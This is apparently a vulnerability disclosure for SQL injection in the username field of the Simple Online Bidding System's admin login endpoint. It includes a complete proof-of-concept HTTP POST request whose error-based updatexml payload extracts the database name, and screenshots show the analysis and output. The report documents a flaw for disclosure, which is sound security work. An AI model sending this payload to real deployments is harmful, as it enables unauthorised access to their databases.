## Sourcecoster simple online bidding system has sql injection vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability file
/simple-online-bidding-system/bidding/admin/ajax.php?action=login2

## Vulnerability analysis
<img width="862" alt="image" src="https://github.com/user-attachments/assets/720b3f36-dc76-4e70-a43c-9d09ed9fb135">
<img width="1020" alt="image" src="https://github.com/user-attachments/assets/10b7dbe9-4208-49f8-9a9b-d6601b30de93">

## describe
There is an unrestricted SQL injection attack in the simple online bidding system, and the controllable parameter is username. An attacker can obtain sensitive server information through this vulnerability.

POC
```
POST /simple-online-bidding-system/bidding/admin/ajax.php?action=login2 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 88
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/bidding/admin/login.php
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

username=admin'%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q&password=a
```

<img width="1086" alt="image" src="https://github.com/user-attachments/assets/64035e90-17e2-4b35-aa99-48805561783e">







